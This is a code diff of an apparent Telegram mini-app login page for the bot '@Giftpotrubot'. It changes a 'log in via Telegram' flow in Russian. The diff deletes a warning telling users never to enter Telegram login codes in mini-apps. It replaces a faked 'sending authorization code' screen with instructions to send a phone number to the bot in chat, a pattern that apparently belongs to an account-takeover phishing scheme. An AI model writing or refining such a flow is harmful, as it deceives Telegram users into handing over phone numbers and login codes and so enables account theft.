@@ -182,31 +182,9 @@
                 Войти через Telegram
             </button>
 
-            <div class="warning">
-                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
-            </div>
+            
             
             <p style="margin-top: 16px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
-        </div>
-
-        <!-- Confirming Step -->
-        <div id="confirming-step" class="step">
-            <svg class="mascot" viewBox="0 0 200 200">
-                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="10" fill="black"/>
-                <circle cx="125" cy="70" r="10" fill="black"/>
-            </svg>
-            
-            <h1>Подтверждение</h1>
-            <p class="subtitle">Telegram запросит разрешение<br>на отправку номера телефона</p>
-            
-            <div class="info-box">
-                ℹ️ Нажмите "Поделиться контактом" в диалоговом окне Telegram
-            </div>
-
-            <div class="loader"></div>
         </div>
 
         <!-- Loading Step -->
@@ -217,8 +195,7 @@
                 <circle cx="125" cy="70" r="18" fill="#999"/>
             </svg>
             
-            <h1>Отправляем код</h1>
-            <h1>авторизации</h1>
+            <h1>Отправляем запрос</h1>
             <p class="subtitle" style="margin-top: 16px;">Пожалуйста, подождите</p>
             
             <div class="loader"></div>
@@ -228,7 +205,11 @@
         <div id="success-step" class="step">
             <div class="success-icon">✅</div>
             <h1>Успешно!</h1>
-            <p class="subtitle">Код отправлен в ваш Telegram.<br>Проверьте сообщения от бота.</p>
+            <p class="subtitle">Бот попросит вас отправить номер<br>телефона в чате. Проверьте сообщения.</p>
+            
+            <div class="info-box">
+                💡 Возвращайтесь в чат с ботом и следуйте инструкциям
+            </div>
         </div>
 
         <!-- Error Step -->
@@ -236,7 +217,7 @@
             <div style="font-size: 64px; margin-bottom: 16px;">❌</div>
             <h1>Ошибка</h1>
             <p class="subtitle" id="error-message">Что-то пошло не так</p>
-            <button class="btn" onclick="showStep('welcome-step')">Попробовать снова</button>
+            <button class="btn" onclick="showStep('welcome-step'); isRequesting = false;">Попробовать снова</button>
         </div>
     </div>
 
@@ -249,7 +230,9 @@
         tg.enableClosingConfirmation();
         
         // Применяем тему Telegram
-        document.body.style.background = tg.themeParams.bg_color || 'linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%)';
+        if (tg.themeParams.bg_color) {
+            document.body.style.background = tg.themeParams.bg_color;
+        }
 
         let isRequesting = false;
 
@@ -271,57 +254,32 @@
             loginBtn.disabled = true;
             loginBtn.textContent = 'Запрос разрешения...';
 
-            showStep('confirming-step');
-
-            // Используем MainButton для подтверждения
-            tg.MainButton.text = 'Поделиться номером телефона';
-            tg.MainButton.color = '#3b82f6';
-            tg.MainButton.show();
-            
-            tg.MainButton.onClick(function() {
-                tg.MainButton.showProgress();
+            // Просто отправляем запрос боту - он попросит номер телефона
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                showStep('loading-step');
                 
-                // Отправляем запрос на контакт через sendData
-                // Бот должен получить initData с contact
-                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                    const userId = tg.initDataUnsafe.user.id;
-                    
-                    // Telegram автоматически добавляет contact при использовании MainButton
-                    // Отправляем запрос боту
-                    tg.sendData(JSON.stringify({
-                        action: 'request_phone',
-                        user_id: userId
-                    }));
+                // Отправляем запрос боту на авторизацию
+                tg.sendData(JSON.stringify({
+                    action: 'request_phone',
+                    user_id: tg.initDataUnsafe.user.id
+                }));
 
-                    tg.MainButton.hide();
-                    showStep('loading-step');
+                // Показываем успех и инструкции
+                setTimeout(() => {
+                    showStep('success-step');
                     
-                    // Симулируем получение кода
+                    // Закрываем через 3 секунды
                     setTimeout(() => {
-                        showStep('success-step');
-                        tg.MainButton.hideProgress();
-                        
-                        // Закрываем через 3 секунды
-                        setTimeout(() => {
-                            tg.close();
-                        }, 3000);
-                    }, 2000);
-                } else {
-                    tg.MainButton.hideProgress();
-                    tg.MainButton.hide();
-                    showError('Не удалось определить пользователя Telegram');
-                    isRequesting = false;
-                }
-            });
+                        tg.close();
+                    }, 3000);
+                }, 1000);
+            } else {
+                showError('Не удалось определить пользователя Telegram');
+                isRequesting = false;
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
+            }
         }
-
-        // Обработка закрытия
-        tg.onEvent('mainButtonClicked', requestPhoneNumber);
-        
-        // Если пользователь закрыл приложение
-        window.addEventListener('beforeunload', () => {
-            tg.MainButton.hide();
-        });
 
         // Логирование для отладки
         console.log('Telegram WebApp initialized:', {
